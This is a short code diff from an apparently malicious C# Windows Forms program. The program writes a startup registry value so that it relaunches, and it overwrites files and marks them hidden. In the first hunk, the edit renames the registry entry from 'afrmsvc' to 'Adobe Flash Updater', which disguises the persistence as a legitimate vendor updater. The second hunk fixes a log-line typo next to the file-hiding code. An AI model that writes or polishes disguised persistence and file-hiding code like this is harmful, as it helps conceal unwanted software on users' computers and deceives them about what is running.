@@ -111,10 +111,10 @@ namespace WindowsFormsApplication1
             {
                 RegistryKey regStartKey = Registry.CurrentUser.OpenSubKey(subkey, false);
 
-                if (regStartKey.GetValue("afrmsvc") == null)
+                if (regStartKey.GetValue("Adobe Flash Updater") == null)
                 {
                     Console.WriteLine("Value does not exist in the registry");
-                    Registry.SetValue(keyName, "afrmsvc", destination);
+                    Registry.SetValue(keyName, "Adobe Flash Updater", destination);
                     Console.WriteLine("Set value in the registry");
                 } else
                 {
@@ -246,7 +246,7 @@ namespace WindowsFormsApplication1
                     Console.WriteLine("The {0} file has been overwritten.", path);
                     // Let's try to make the file hidden
                     File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
-                    Console.WriteLine("The {0} file is now hidden,".path);
+                    Console.WriteLine("The {0} file is now hidden,",path);
                 }
             }
 
